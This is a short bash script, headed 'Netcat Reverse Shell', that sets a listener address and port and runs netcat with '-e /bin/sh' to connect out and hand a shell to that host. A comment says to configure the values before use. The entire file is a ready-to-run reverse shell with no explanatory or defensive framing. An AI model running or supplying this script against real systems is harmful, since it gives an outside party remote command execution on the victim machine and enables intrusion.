#!/bin/bash
# Netcat Reverse Shell
# Configure LHOST and LPORT before use

LHOST="192.168.1.100"
LPORT=4444

nc -e /bin/sh $LHOST $LPORT